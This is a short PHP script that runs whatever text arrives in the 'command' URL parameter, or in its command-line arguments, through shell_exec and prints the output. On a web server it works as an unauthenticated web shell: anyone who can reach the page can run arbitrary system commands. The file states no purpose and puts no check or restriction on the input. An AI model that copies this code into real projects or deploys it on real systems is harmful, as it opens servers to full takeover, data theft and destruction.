<?php
	if (defined('STDIN')) {
		  $args = $argv;
		  $command = join(" ", array_slice($args, 1));
	} else {
		  $command = $_GET['command'];
	}
	header('Content-Type: application/json; charset=utf-8');
	print_r(shell_exec($command));
?>
